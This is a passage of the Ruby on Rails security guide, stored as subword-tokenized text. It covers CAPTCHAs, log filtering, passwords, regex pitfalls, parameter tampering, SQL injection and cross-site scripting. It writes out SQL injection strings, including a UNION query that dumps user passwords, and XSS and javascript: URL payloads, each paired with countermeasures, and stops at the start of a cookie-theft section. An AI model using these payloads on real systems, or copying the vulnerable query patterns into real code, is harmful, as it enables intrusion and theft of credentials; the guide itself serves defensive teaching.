▁The ▁idea ▁of ▁a ▁ n eg a tive ▁ CAPTCHA ▁is ▁not ▁for ▁a ▁user ▁to ▁pro ve ▁that ▁they ▁are ▁human , ▁but ▁re ve al ▁that ▁a ▁ r ob o t ▁is ▁a ▁ r ob o t .
▁But ▁not ▁only ▁sp am ▁ r ob o t s ▁( b o t s ) ▁are ▁a ▁problem , ▁but ▁also ▁automatic ▁login ▁bot s .
▁A ▁popular ▁ CAPTCHA ▁API ▁is ▁[ re CAPTCHA ]( http :// recaptcha . net / ) ▁which ▁display s ▁two ▁d ist or t ed ▁images ▁of ▁words ▁from ▁old ▁book s .
▁It ▁also ▁add s ▁an ▁ angle d ▁line , ▁rather ▁than ▁a ▁d ist or t ed ▁background ▁and ▁high ▁level s ▁of ▁ w ar p ing ▁on ▁the ▁text ▁as ▁earlier ▁ CAPTCHA s ▁did , ▁because ▁the ▁latter ▁were ▁broken .
▁As ▁a ▁b on us , ▁using ▁re CAPTCHA ▁help s ▁to ▁d i git ize ▁old ▁book s .
▁[ Re CAPTCHA ]( https :// github . com / am be th i a / recaptcha / ) ▁is ▁also ▁a ▁Rails ▁plug - in ▁with ▁the ▁same ▁name ▁as ▁the ▁API .
▁You ▁will ▁get ▁two ▁keys ▁from ▁the ▁API , ▁a ▁public ▁and ▁a ▁private ▁key , ▁which ▁you ▁have ▁to ▁put ▁into ▁your ▁Rails ▁environment .
▁After ▁that ▁you ▁can ▁use ▁the ▁ recaptcha _ tag s ▁method ▁in ▁the ▁view , ▁and ▁the ▁verify _ recaptcha ▁method ▁in ▁the ▁controller .
▁Verify _ recaptcha ▁will ▁return ▁false ▁if ▁the ▁validation ▁fails .
▁The ▁problem ▁with ▁ CAPTCHA s ▁is , ▁they ▁are ▁an no ying .
▁Add it ion ally , ▁some ▁ visual ly ▁i mp a ir ed ▁users ▁have ▁found ▁certain ▁kind s ▁of ▁d ist or t ed ▁ CAPTCHA s ▁difficult ▁to ▁read .
▁The ▁idea ▁of ▁ n eg a tive ▁ CAPTCHA s ▁is ▁not ▁to ▁as k ▁a ▁user ▁to ▁ proof ▁that ▁they ▁are ▁human , ▁but ▁re ve al ▁that ▁a ▁sp am ▁ r ob o t ▁is ▁a ▁bot .
▁ Most ▁bot s ▁are ▁really ▁d um b , ▁they ▁c raw l ▁the ▁web ▁and ▁put ▁their ▁sp am ▁into ▁every ▁form ' s ▁field ▁they ▁can ▁find .
▁N eg a tive ▁ CAPTCHA s ▁take ▁advantage ▁of ▁that ▁and ▁include ▁a ▁" h one y p o t " ▁field ▁in ▁the ▁form ▁which ▁will ▁be ▁hidden ▁from ▁the ▁human ▁user ▁by ▁CSS ▁or ▁JavaScript .
▁Here ▁are ▁some ▁idea s ▁how ▁to ▁h id e ▁h one y p o t ▁fields ▁by ▁JavaScript ▁and / or ▁CSS :
▁* ▁position ▁the ▁fields ▁off ▁of ▁the ▁visible ▁are a ▁of ▁the ▁page
▁* ▁make ▁the ▁elements ▁very ▁small ▁or ▁color ▁them ▁the ▁same ▁as ▁the ▁background ▁of ▁the ▁page
▁* ▁leave ▁the ▁fields ▁displayed , ▁but ▁tell ▁human s ▁to ▁leave ▁them ▁blank
▁The ▁most ▁simple ▁ n eg a tive ▁ CAPTCHA ▁is ▁one ▁hidden ▁h one y p o t ▁field .
▁On ▁the ▁server ▁side , ▁you ▁will ▁check ▁the ▁value ▁of ▁the ▁field : ▁If ▁it ▁contains ▁any ▁text , ▁it ▁must ▁be ▁a ▁bot .
▁Then , ▁you ▁can ▁either ▁ignore ▁the ▁post ▁or ▁return ▁a ▁p o s i tive ▁result , ▁but ▁not ▁saving ▁the ▁post ▁to ▁the ▁database .
▁This ▁way ▁the ▁bot ▁will ▁be ▁ satisf i ed ▁and ▁move s ▁on .
▁You ▁can ▁do ▁this ▁with ▁an no ying ▁users , ▁too .
▁You ▁can ▁find ▁more ▁sophisticat ed ▁ n eg a tive ▁ CAPTCHA s ▁in ▁N ed ▁B at c hel d er ' s ▁[ blog ▁post ]( http :// n ed b at c hel d er . com / text / s to p b o t s . html ) :
▁* ▁ Includ e ▁a ▁field ▁with ▁the ▁current ▁UTC ▁time - st am p ▁in ▁it ▁and ▁check ▁it ▁on ▁the ▁server .
▁If ▁it ▁is ▁too ▁far ▁in ▁the ▁ past , ▁or ▁if ▁it ▁is ▁in ▁the ▁future , ▁the ▁form ▁is ▁invalid .
▁* ▁R and o m ize ▁the ▁field ▁names
▁* ▁ Includ e ▁more ▁than ▁one ▁h one y p o t ▁field ▁of ▁all ▁types , ▁including ▁submission ▁button s
▁Note ▁that ▁this ▁protect s ▁you ▁only ▁from ▁automatic ▁bot s , ▁target ed ▁tailor - ma de ▁bot s ▁cannot ▁be ▁stop ped ▁by ▁this .
▁So ▁ _ n eg a tive ▁ CAPTCHA s ▁m ight ▁not ▁be ▁good ▁to ▁protect ▁login ▁forms _ .
▁### ▁Logging
▁WARNING : ▁ _ T e ll ▁Rails ▁not ▁to ▁put ▁passwords ▁in ▁the ▁log ▁files .
▁By ▁default , ▁Rails ▁log s ▁all ▁requests ▁being ▁made ▁to ▁the ▁web ▁application .
▁But ▁log ▁files ▁can ▁be ▁a ▁ huge ▁security ▁issue , ▁as ▁they ▁may ▁contain ▁login ▁credentials , ▁c r edit ▁ card ▁number s ▁ et ▁ ce ter a .
▁When ▁design ing ▁a ▁web ▁application ▁security ▁ concept , ▁you ▁should ▁also ▁think ▁about ▁what ▁will ▁happen ▁if ▁an ▁attacker ▁go t ▁( full ) ▁access ▁to ▁the ▁web ▁server .
▁E n crypt ing ▁secret s ▁and ▁passwords ▁in ▁the ▁database ▁will ▁be ▁quite ▁use less , ▁if ▁the ▁log ▁files ▁list ▁them ▁in ▁clear ▁text .
▁You ▁can ▁ _ filter ▁certain ▁request ▁parameters ▁from ▁your ▁log ▁files _ ▁by ▁app end ing ▁them ▁to ▁` config . filter _ parameters ` ▁in ▁the ▁application ▁configuration .
▁These ▁parameters ▁will ▁be ▁ marked ▁[ F I L T ER E D ] ▁in ▁the ▁log .
▁config . filter _ parameters ▁< < ▁: password
▁### ▁G ood ▁ Password s
▁INFO : ▁ _ Do ▁you ▁find ▁it ▁hard ▁to ▁remember ▁all ▁your ▁passwords ?
▁Do n ' t ▁write ▁them ▁down , ▁but ▁use ▁the ▁initial ▁letter s ▁of ▁each ▁word ▁in ▁an ▁easy ▁to ▁remember ▁ sentence .
▁It ▁turn s ▁out ▁that ▁most ▁of ▁the ▁passwords ▁are ▁quite ▁easy ▁to ▁c rack .
▁The ▁20 ▁most ▁common ▁passwords ▁are :
▁password 1, ▁a b c 12 3 , ▁my space 1, ▁password , ▁b link 18 2 , ▁ q w er t y 1, ▁** ** you , ▁123 a b c , ▁base b all 1, ▁ foo t b all 1, ▁ 12345 6 , ▁so cc er , ▁m on key 1, ▁live r p o ol 1, ▁p r ince s s 1, ▁ j or d an 23 , ▁ s li p k not 1, ▁ super ma n 1, ▁i lo ve you 1, ▁and ▁m on key .
▁It ▁is ▁interest ing ▁that ▁only ▁4 % ▁of ▁these ▁passwords ▁were ▁d ic t ion ary ▁words ▁and ▁the ▁great ▁major ity ▁is ▁actually ▁ al ph an umeric .
▁However , ▁password ▁c rack er ▁d ic t ion ar ies ▁contain ▁a ▁large ▁number ▁of ▁to day ' s ▁passwords , ▁and ▁they ▁try ▁out ▁all ▁kind s ▁of ▁( al ph an umeric al ) ▁combination s .
▁If ▁an ▁attacker ▁know s ▁your ▁user ▁name ▁and ▁you ▁use ▁a ▁we a k ▁password , ▁your ▁account ▁will ▁be ▁easily ▁c rack ed .
▁A ▁good ▁password ▁is ▁a ▁long ▁ al ph an umeric ▁combination ▁of ▁mix ed ▁cases .
▁As ▁this ▁is ▁quite ▁hard ▁to ▁remember , ▁it ▁is ▁a d v is able ▁to ▁enter ▁only ▁the ▁ _ first ▁letter s ▁of ▁a ▁ sentence ▁that ▁you ▁can ▁easily ▁remember _ .
▁For ▁example ▁" The ▁quick ▁b row n ▁f o x ▁jump s ▁over ▁the ▁ la z y ▁do g " ▁will ▁be ▁" T q b f j o tld ".
▁Note ▁that ▁this ▁is ▁just ▁an ▁example , ▁you ▁should ▁not ▁use ▁well ▁known ▁ ph ra s es ▁like ▁these , ▁as ▁they ▁m ight ▁appear ▁in ▁c rack er ▁d ic t ion ar ies , ▁too .
▁### ▁R egular ▁Exp re s s ion s
▁INFO : ▁ _ A ▁common ▁p it f all ▁in ▁Ruby ' s ▁regular ▁expression s ▁is ▁to ▁match ▁the ▁string ' s ▁beginning ▁and ▁end ▁by ▁ ^ ▁and ▁ $ , ▁instead ▁of ▁\ A ▁and ▁\ z .
▁Ruby ▁uses ▁a ▁slightly ▁different ▁approach ▁than ▁many ▁other ▁languages ▁to ▁match ▁the ▁end ▁and ▁the ▁beginning ▁of ▁a ▁string .
▁That ▁is ▁why ▁even ▁many ▁Ruby ▁and ▁Rails ▁book s ▁get ▁this ▁wrong .
▁So ▁how ▁is ▁this ▁a ▁security ▁thr e at ?
▁S a y ▁you ▁want ed ▁to ▁ lo o se ly ▁validate ▁a ▁URL ▁field ▁and ▁you ▁used ▁a ▁simple ▁regular ▁expression ▁like ▁this :
▁/ ^ https ? : \ / \ / [ ^ \ n ] +$ / i
▁This ▁may ▁work ▁fine ▁in ▁some ▁languages .
▁However , ▁ _ in ▁Ruby ▁ ^ ▁and ▁ $ ▁match ▁the ▁** line ** ▁beginning ▁and ▁line ▁end _ .
▁And ▁thus ▁a ▁URL ▁like ▁this ▁passes ▁the ▁filter ▁without ▁problem s :
▁javascript : exploit _ code ( ) ; / *
▁ http :// h i . com
▁This ▁URL ▁passes ▁the ▁filter ▁because ▁the ▁regular ▁expression ▁matches ▁- ▁the ▁second ▁line , ▁the ▁rest ▁does ▁not ▁matter .
▁Now ▁i ma g ine ▁we ▁ha d ▁a ▁view ▁that ▁show ed ▁the ▁URL ▁like ▁this :
▁link _ to ▁" Home page ", ▁@ user . home page
▁The ▁link ▁look s ▁in no c ent ▁to ▁visit or s , ▁but ▁when ▁it ' s ▁click ed , ▁it ▁will ▁execute ▁the ▁JavaScript ▁function ▁" exploit _ code " ▁or ▁any ▁other ▁JavaScript ▁the ▁attacker ▁provides .
▁To ▁fix ▁the ▁regular ▁expression , ▁\ A ▁and ▁\ z ▁should ▁be ▁used ▁instead ▁of ▁ ^ ▁and ▁ $ , ▁like ▁so :
▁/ \ A https ? : \ / \ / [ ^ \ n ] + \ z / i
▁S ince ▁this ▁is ▁a ▁frequent ▁mistake , ▁the ▁format ▁validator ▁( validates _ format _ of ) ▁now ▁raise s ▁an ▁exception ▁if ▁the ▁provided ▁regular ▁expression ▁start s ▁with ▁ ^ ▁or ▁end s ▁with ▁ $ .
▁If ▁you ▁do ▁need ▁to ▁use ▁ ^ ▁and ▁ $ ▁instead ▁of ▁\ A ▁and ▁\ z ▁( which ▁is ▁rare ), ▁you ▁can ▁set ▁the ▁: multiline ▁option ▁to ▁true , ▁like ▁so :
▁# ▁content ▁should ▁include ▁a ▁line ▁" Meanwhile " ▁any where ▁in ▁the ▁string
▁validates ▁: content , ▁format : ▁ { ▁with : ▁/ ^ Meanwhile $ / , ▁ multiline : ▁true ▁ }
▁Note ▁that ▁this ▁only ▁protect s ▁you ▁again st ▁the ▁most ▁common ▁mistake ▁when ▁using ▁the ▁format ▁validator ▁- ▁you ▁always ▁need ▁to ▁keep ▁in ▁mind ▁that ▁ ^ ▁and ▁ $ ▁match ▁the ▁** line ** ▁beginning ▁and ▁line ▁end ▁in ▁Ruby , ▁and ▁not ▁the ▁beginning ▁and ▁end ▁of ▁a ▁string .
▁### ▁P r i v i le ge ▁E sc al ation
▁WARNING : ▁ _ Chang ing ▁a ▁single ▁parameter ▁may ▁give ▁the ▁user ▁un authorize d ▁access .
▁Re member ▁that ▁every ▁parameter ▁may ▁be ▁changed , ▁no ▁matter ▁how ▁much ▁you ▁h id e ▁or ▁ ob f us c ate ▁it .
▁The ▁most ▁common ▁parameter ▁that ▁a ▁user ▁m ight ▁tamper ▁with , ▁is ▁the ▁id ▁parameter , ▁as ▁in ▁` http :// www . domain . com / project /1 `, ▁whereas ▁1 ▁is ▁the ▁id .
▁It ▁will ▁be ▁available ▁in ▁params ▁in ▁the ▁controller .
▁There , ▁you ▁will ▁most ▁likely ▁do ▁something ▁like ▁this :
▁@ project ▁= ▁ Pro j ec t . find ( params [: id ])
▁This ▁is ▁ al right ▁for ▁some ▁web ▁applications , ▁but ▁certain ly ▁not ▁if ▁the ▁user ▁is ▁not ▁authoriz ed ▁to ▁view ▁all ▁project s .
▁If ▁the ▁user ▁changes ▁the ▁id ▁to ▁42 , ▁and ▁they ▁are ▁not ▁allowed ▁to ▁see ▁that ▁information , ▁they ▁will ▁have ▁access ▁to ▁it ▁any way .
▁Instead , ▁ _ query ▁the ▁user ' s ▁access ▁right s , ▁too _ :
▁@ project ▁= ▁@ current _ user . projects . find ( params [: id ])
▁De pending ▁on ▁your ▁web ▁application , ▁there ▁will ▁be ▁many ▁more ▁parameters ▁the ▁user ▁can ▁tamper ▁with .
▁As ▁a ▁rule ▁of ▁thumb , ▁ _ no ▁user ▁input ▁data ▁is ▁secure , ▁un til ▁pro ve n ▁otherwise , ▁and ▁every ▁parameter ▁from ▁the ▁user ▁is ▁ potentially ▁manipulate d _ .
▁Do n ' t ▁be ▁ foo l ed ▁by ▁security ▁by ▁ ob f us c ation ▁and ▁JavaScript ▁security .
▁The ▁Web ▁De ve lo p er ▁To ol bar ▁for ▁Mo z il la ▁Firefox ▁let s ▁you ▁review ▁and ▁change ▁every ▁form ' s ▁hidden ▁fields .
▁ _ JavaScript ▁can ▁be ▁used ▁to ▁validate ▁user ▁input ▁data , ▁but ▁certain ly ▁not ▁to ▁prevent ▁attacker s ▁from ▁sending ▁ malicious ▁requests ▁with ▁un expected ▁values _ .
▁The ▁L ive ▁ Http ▁Header s ▁plugin ▁for ▁Mo z il la ▁Firefox ▁log s ▁every ▁request ▁and ▁may ▁ r epeat ▁and ▁change ▁them .
▁That ▁is ▁an ▁easy ▁way ▁to ▁bypass ▁any ▁JavaScript ▁validations .
▁And ▁there ▁are ▁even ▁client - side ▁pro x ies ▁that ▁allow ▁you ▁to ▁intercept ▁any ▁request ▁and ▁response ▁from ▁and ▁to ▁the ▁ Internet .
▁Injection
▁ ---------
▁INFO : ▁ _ In j ection ▁is ▁a ▁class ▁of ▁attacks ▁that ▁introduce ▁ malicious ▁code ▁or ▁parameters ▁into ▁a ▁web ▁application ▁in ▁order ▁to ▁run ▁it ▁within ▁its ▁security ▁context .
▁ Pro m in ent ▁examples ▁of ▁injection ▁are ▁c ross - site ▁ script ing ▁( X SS ) ▁and ▁SQL ▁injection .
▁Injection ▁is ▁very ▁trick y , ▁because ▁the ▁same ▁code ▁or ▁parameter ▁can ▁be ▁ malicious ▁in ▁one ▁context , ▁but ▁total ly ▁harm less ▁in ▁another .
▁A ▁context ▁can ▁be ▁a ▁ script ing , ▁query ▁or ▁programming ▁language , ▁the ▁ s hel l ▁or ▁a ▁Ruby / Rails ▁method .
▁The ▁following ▁section s ▁will ▁cover ▁all ▁important ▁context s ▁where ▁injection ▁attacks ▁may ▁happen .
▁The ▁first ▁section , ▁however , ▁cover s ▁an ▁architectur al ▁d ec is ion ▁in ▁connection ▁with ▁Injection .
▁### ▁Whi t e list s ▁ v ers us ▁B la c k list s
▁NOTE : ▁ _ W h en ▁sanit i z ing , ▁protect ing ▁or ▁verify ing ▁something , ▁prefer ▁ white list s ▁over ▁blacklist s .
▁A ▁blacklist ▁can ▁be ▁a ▁list ▁of ▁ bad ▁e - mail ▁addresses , ▁non - public ▁actions ▁or ▁ bad ▁HTML ▁tags .
▁This ▁is ▁oppos ed ▁to ▁a ▁ white list ▁which ▁list s ▁the ▁good ▁e - mail ▁addresses , ▁public ▁actions , ▁good ▁HTML ▁tags ▁and ▁so ▁on .
▁A lthough ▁some times ▁it ▁is ▁not ▁possible ▁to ▁create ▁a ▁ white list ▁( in ▁a ▁S P A M ▁filter , ▁for ▁example ), ▁ _ p ref er ▁to ▁use ▁ white list ▁approach es _ :
▁* ▁Use ▁before _ action ▁only : ▁[ . . . ] ▁instead ▁of ▁except : ▁[ . . . ] .
▁This ▁way ▁you ▁don ' t ▁ forget ▁to ▁turn ▁it ▁off ▁for ▁new ly ▁added ▁actions .
▁* ▁A l low ▁ & lt ; strong & gt ; ▁instead ▁of ▁remov ing ▁ & lt ; script & gt ; ▁again st ▁C ross - Site ▁S c r ip ting ▁( X SS ).
▁See ▁below ▁for ▁details .
▁* ▁Do n ' t ▁try ▁to ▁correct ▁user ▁input ▁by ▁blacklist s :
▁* ▁This ▁will ▁make ▁the ▁attack ▁work : ▁" & lt ; sc & lt ; script & gt ; r ip t & gt ; ". g sub (" & lt ; script & gt ; ", ▁" ")
▁* ▁But ▁reject ▁m al form ed ▁input
▁Whi t e list s ▁are ▁also ▁a ▁good ▁approach ▁again st ▁the ▁human ▁factor ▁of ▁for getting ▁something ▁in ▁the ▁blacklist .
▁### ▁SQL ▁Injection
▁INFO : ▁ _ T hanks ▁to ▁cl ever ▁methods , ▁this ▁is ▁hard ly ▁a ▁problem ▁in ▁most ▁Rails ▁applications .
▁However , ▁this ▁is ▁a ▁very ▁ dev as t at ing ▁and ▁common ▁attack ▁in ▁web ▁applications , ▁so ▁it ▁is ▁important ▁to ▁understand ▁the ▁problem .
▁#### ▁In tr o d u c t ion
▁SQL ▁injection ▁attacks ▁a i m ▁at ▁in f l ue n c ing ▁database ▁queries ▁by ▁m anipulating ▁web ▁application ▁parameters .
▁A ▁popular ▁goal ▁of ▁SQL ▁injection ▁attacks ▁is ▁to ▁bypass ▁authorization .
▁A nother ▁goal ▁is ▁to ▁c ar ry ▁out ▁data ▁ manipulati on ▁or ▁reading ▁arbitrar y ▁data .
▁Here ▁is ▁an ▁example ▁of ▁how ▁not ▁to ▁use ▁user ▁input ▁data ▁in ▁a ▁query :
▁ Pro j ec t . where (" name ▁= ▁' # { params [: name ]} ' ")
▁This ▁could ▁be ▁in ▁a ▁search ▁action ▁and ▁the ▁user ▁may ▁enter ▁a ▁project ' s ▁name ▁that ▁they ▁want ▁to ▁find .
▁If ▁a ▁ malicious ▁user ▁enter s ▁' ▁OR ▁1 ▁-- , ▁the ▁result ing ▁SQL ▁query ▁will ▁be :
▁ SELECT ▁* ▁FROM ▁project s ▁WHERE ▁name ▁= ▁ '' ▁OR ▁1 ▁-- '
▁The ▁two ▁d as h es ▁start ▁a ▁comment ▁ignoring ▁everything ▁after ▁it .
▁So ▁the ▁query ▁returns ▁all ▁records ▁from ▁the ▁project s ▁table ▁including ▁those ▁b li n d ▁to ▁the ▁user .
▁This ▁is ▁because ▁the ▁condition ▁is ▁true ▁for ▁all ▁records .
▁#### ▁By passing ▁ Auth or i z ation
▁U s u ally ▁a ▁web ▁application ▁includes ▁access ▁control .
▁The ▁user ▁enter s ▁their ▁login ▁credentials ▁and ▁the ▁web ▁application ▁ tries ▁to ▁find ▁the ▁matching ▁record ▁in ▁the ▁users ▁table .
▁The ▁application ▁gra n t s ▁access ▁when ▁it ▁find s ▁a ▁record .
▁However , ▁an ▁attacker ▁may ▁ possibl y ▁bypass ▁this ▁check ▁with ▁SQL ▁injection .
▁The ▁following ▁shows ▁a ▁typical ▁database ▁query ▁in ▁Rails ▁to ▁find ▁the ▁first ▁record ▁in ▁the ▁users ▁table ▁which ▁matches ▁the ▁login ▁credentials ▁parameters ▁supplied ▁by ▁the ▁user .
▁User . first (" login ▁= ▁' # { params [: name ]} ' ▁ AND ▁password ▁= ▁' # { params [: password ]} ' ")
▁If ▁an ▁attacker ▁enter s ▁' ▁OR ▁' 1 ' =' 1 ▁as ▁the ▁name , ▁and ▁' ▁OR ▁' 2 ' > ' 1 ▁as ▁the ▁password , ▁the ▁result ing ▁SQL ▁query ▁will ▁be :
▁ SELECT ▁* ▁FROM ▁users ▁WHERE ▁login ▁= ▁ '' ▁OR ▁' 1 ' =' 1 ' ▁ AND ▁password ▁= ▁ '' ▁OR ▁' 2 ' > ' 1 ' ▁LIMIT ▁1
▁This ▁will ▁simply ▁find ▁the ▁first ▁record ▁in ▁the ▁database , ▁and ▁gra n t s ▁access ▁to ▁this ▁user .
▁#### ▁Un authorize d ▁Read ing
▁The ▁U N I ON ▁statement ▁connect s ▁two ▁SQL ▁queries ▁and ▁returns ▁the ▁data ▁in ▁one ▁set .
▁An ▁attacker ▁can ▁use ▁it ▁to ▁read ▁arbitrar y ▁data ▁from ▁the ▁database .
▁Let ' s ▁take ▁the ▁example ▁from ▁above :
▁And ▁now ▁let ' s ▁inject ▁another ▁query ▁using ▁the ▁U N I ON ▁statement :
▁ ') ▁U N I ON ▁ SELECT ▁id , login ▁A S ▁name , password ▁A S ▁description , 1, 1, 1 ▁FROM ▁users ▁--
▁This ▁will ▁result ▁in ▁the ▁following ▁SQL ▁query :
▁ SELECT ▁* ▁FROM ▁project s ▁WHERE ▁( name ▁= ▁ '') ▁U N I ON
▁ SELECT ▁id , login ▁A S ▁name , password ▁A S ▁description , 1, 1, 1 ▁FROM ▁users ▁-- '
▁The ▁result ▁won ' t ▁be ▁a ▁list ▁of ▁project s ▁( because ▁there ▁is ▁no ▁project ▁with ▁an ▁empty ▁name ), ▁but ▁a ▁list ▁of ▁user ▁names ▁and ▁their ▁password .
▁So ▁hope full y ▁you ▁encrypted ▁the ▁passwords ▁in ▁the ▁database !
▁The ▁only ▁problem ▁for ▁the ▁attacker ▁is , ▁that ▁the ▁number ▁of ▁columns ▁has ▁to ▁be ▁the ▁same ▁in ▁both ▁queries .
▁That ' s ▁why ▁the ▁second ▁query ▁includes ▁a ▁list ▁of ▁one s ▁ (1) , ▁which ▁will ▁be ▁always ▁the ▁value ▁1, ▁in ▁order ▁to ▁match ▁the ▁number ▁of ▁columns ▁in ▁the ▁first ▁query .
▁Also , ▁the ▁second ▁query ▁re name s ▁some ▁columns ▁with ▁the ▁A S ▁statement ▁so ▁that ▁the ▁web ▁application ▁display s ▁the ▁values ▁from ▁the ▁user ▁table .
▁Be ▁sure ▁to ▁update ▁your ▁Rails ▁[ to ▁at ▁least ▁2.1. 1 ]( http :// www . r or security . info / 200 8 / 0 9 / 08 / sql - in j ection - issue - in - limit - and - offset - param e ter / ).
▁#### ▁C ountermeasures
▁Ruby ▁on ▁Rails ▁has ▁a ▁built - in ▁filter ▁for ▁special ▁SQL ▁characters , ▁which ▁will ▁escape ▁' ▁ , ▁" ▁ , ▁NULL ▁character ▁and ▁line ▁break s .
▁Instead ▁of ▁passing ▁a ▁string ▁to ▁the ▁conditions ▁option , ▁you ▁can ▁pass ▁an ▁array ▁to ▁ sanitize ▁t aint ed ▁strings ▁like ▁this :
▁Model . where (" login ▁= ▁ ?
▁ AND ▁password ▁= ▁ ? ", ▁entered _ user _ name , ▁entered _ password ). first
▁As ▁you ▁can ▁see , ▁the ▁first ▁part ▁of ▁the ▁array ▁is ▁an ▁SQL ▁fragment ▁with ▁question ▁mark s .
▁The ▁ sanitize d ▁versions ▁of ▁the ▁variables ▁in ▁the ▁second ▁part ▁of ▁the ▁array ▁replace ▁the ▁question ▁mark s .
▁Or ▁you ▁can ▁pass ▁a ▁hash ▁for ▁the ▁same ▁result :
▁Model . where ( login : ▁entered _ user _ name , ▁password : ▁entered _ password ). first
▁The ▁array ▁or ▁hash ▁form ▁is ▁only ▁available ▁in ▁model ▁instance s .
▁You ▁can ▁try ▁` sanitize _ sql ( )` ▁else where .
▁ _ Make ▁it ▁a ▁habit ▁to ▁think ▁about ▁the ▁security ▁con sequence s ▁when ▁using ▁an ▁external ▁string ▁in ▁SQL _ .
▁### ▁C ross - Site ▁S c r ip ting ▁( X SS )
▁INFO : ▁ _ The ▁most ▁ wide s p read , ▁and ▁one ▁of ▁the ▁most ▁ dev as t at ing ▁security ▁vulnerabilities ▁in ▁web ▁applications ▁is ▁ X SS .
▁This ▁ malicious ▁attack ▁inject s ▁client - side ▁executable ▁code .
▁Rails ▁provides ▁helper ▁methods ▁to ▁f end ▁these ▁attacks ▁off .
▁#### ▁E n try ▁P o in t s
▁An ▁entry ▁point ▁is ▁a ▁vulnerable ▁URL ▁and ▁its ▁parameters ▁where ▁an ▁attacker ▁can ▁start ▁an ▁attack .
▁The ▁most ▁common ▁entry ▁point s ▁are ▁message ▁posts , ▁user ▁comments , ▁and ▁ guest ▁book s , ▁but ▁project ▁title s , ▁document ▁names ▁and ▁search ▁result ▁pages ▁have ▁also ▁been ▁vulnerable ▁- ▁just ▁about ▁every where ▁where ▁the ▁user ▁can ▁input ▁data .
▁But ▁the ▁input ▁does ▁not ▁necessar ily ▁have ▁to ▁come ▁from ▁input ▁box es ▁on ▁web ▁site s , ▁it ▁can ▁be ▁in ▁any ▁URL ▁parameter ▁- ▁obvious , ▁hidden ▁or ▁internal .
▁Re member ▁that ▁the ▁user ▁may ▁intercept ▁any ▁traffic .
▁Application s , ▁such ▁as ▁the ▁[ L ive ▁HTTP ▁Header s ▁Firefox ▁plugin ]( http :// li ve http header s . m o z dev . org / ), ▁or ▁client - site ▁pro x ies ▁make ▁it ▁easy ▁to ▁change ▁requests .
▁ X SS ▁attacks ▁work ▁like ▁this : ▁An ▁attacker ▁inject s ▁some ▁code , ▁the ▁web ▁application ▁save s ▁it ▁and ▁display s ▁it ▁on ▁a ▁page , ▁later ▁present ed ▁to ▁a ▁victim .
▁ Most ▁ X SS ▁examples ▁simply ▁display ▁an ▁ alert ▁box , ▁but ▁it ▁is ▁more ▁powerful ▁than ▁that .
▁ X SS ▁can ▁steal ▁the ▁cookie , ▁ hijack ▁the ▁session , ▁redirect ▁the ▁victim ▁to ▁a ▁fake ▁website , ▁display ▁a d ve r t is e ment s ▁for ▁the ▁benefit ▁of ▁the ▁attacker , ▁change ▁elements ▁on ▁the ▁web ▁site ▁to ▁get ▁confident i al ▁information ▁or ▁install ▁ malicious ▁software ▁through ▁security ▁hole s ▁in ▁the ▁web ▁browser .
▁D ur ing ▁the ▁second ▁half ▁of ▁200 7 , ▁there ▁were ▁ 88 ▁vulnerabilities ▁report ed ▁in ▁Mo z il la ▁browsers , ▁ 22 ▁in ▁Safari , ▁ 18 ▁in ▁I E , ▁and ▁ 12 ▁in ▁O p er a .
▁The ▁[ S ymantec ▁G lo b al ▁ Internet ▁ Security ▁thr e at ▁report ]( http :// eval . s ymantec . com / m k t g info / e nterprise / white _ paper s / b - white paper _ in ter net _ security _ th re at _ re port _ x i i i _ 04 - 200 8 . en - us . p d f ) ▁also ▁document ed ▁2 39 ▁browser ▁plug - in ▁vulnerabilities ▁in ▁the ▁last ▁ s i x ▁ months ▁of ▁200 7 .
▁[ M p ac k ]( http :// p and al abs . p and a security . com / mp ac k - un c over ed / ) ▁is ▁a ▁very ▁active ▁and ▁up - to - date ▁attack ▁framework ▁which ▁ exploit s ▁these ▁vulnerabilities .
▁For ▁c r i m in al ▁ha c k ers , ▁it ▁is ▁very ▁ attr active ▁to ▁ exploit ▁an ▁SQL - In j ection ▁ vulnerabilit y ▁in ▁a ▁web ▁application ▁framework ▁and ▁insert ▁ malicious ▁code ▁in ▁every ▁text u al ▁table ▁column .
▁In ▁Apr il ▁200 8 ▁more ▁than ▁5 10 , 000 ▁site s ▁were ▁ha c k ed ▁like ▁this , ▁a mong ▁them ▁the ▁B r it is h ▁g over n ment , ▁Un it ed ▁N ation s , ▁and ▁many ▁more ▁high ▁target s .
▁A ▁relative ly ▁new , ▁and ▁un us u al , ▁form ▁of ▁entry ▁point s ▁are ▁ banner ▁a d ve r t is e ment s .
▁In ▁earlier ▁200 8 , ▁ malicious ▁code ▁appear ed ▁in ▁ banner ▁ ads ▁on ▁popular ▁site s , ▁such ▁as ▁My Space ▁and ▁ Ex c ite , ▁according ▁to ▁[ T r end ▁M ic r o ]( http :// blog . tr end micro . com / my space - ex c ite - and - b li c k - serve - up - malicious - banner - ads / ).
▁#### ▁HTML / JavaScript ▁Injection
▁The ▁most ▁common ▁ X SS ▁language ▁is ▁of ▁course ▁the ▁most ▁popular ▁client - side ▁ script ing ▁language ▁JavaScript , ▁often ▁in ▁combination ▁with ▁HTML . ▁ _ E sc ap ing ▁user ▁input ▁is ▁essential _ .
▁Here ▁is ▁the ▁most ▁straightforward ▁test ▁to ▁check ▁for ▁ X SS :
▁< script > alert (' Hello ') ; </ script >
▁This ▁JavaScript ▁code ▁will ▁simply ▁display ▁an ▁ alert ▁box .
▁The ▁next ▁examples ▁do ▁exactly ▁the ▁same , ▁only ▁in ▁very ▁un common ▁place s :
▁< img ▁src = javascript : alert (' Hello ') >
▁< table ▁background =" javascript : alert (' Hello ') ">
▁#### # ▁Co o k i e ▁The f t
▁These ▁examples ▁don ' t ▁do ▁any ▁harm ▁so ▁far , ▁so ▁let ' s ▁see ▁how ▁an ▁attacker ▁can ▁steal ▁the ▁user ' s ▁cookie ▁( and ▁thus ▁ hijack ▁the ▁user ' s ▁session ).
▁In ▁JavaScript ▁you ▁can ▁use ▁the ▁document . cookie ▁property ▁to ▁read ▁and ▁write ▁the ▁document ' s ▁cookie .
▁JavaScript ▁enforce s ▁the ▁same ▁ origin ▁policy , ▁that ▁means ▁a ▁ script ▁from ▁one ▁domain ▁cannot ▁access ▁cookies ▁of ▁another ▁domain .
▁The ▁document . cookie ▁property ▁hold s ▁the ▁cookie ▁of ▁the ▁ origin at ing ▁web ▁server .
▁However , ▁you ▁can ▁read ▁and ▁write ▁this ▁property , ▁if ▁you ▁embed ▁the ▁code ▁directly ▁in ▁the ▁HTML ▁document ▁( as ▁it ▁happens ▁with ▁ X SS ).
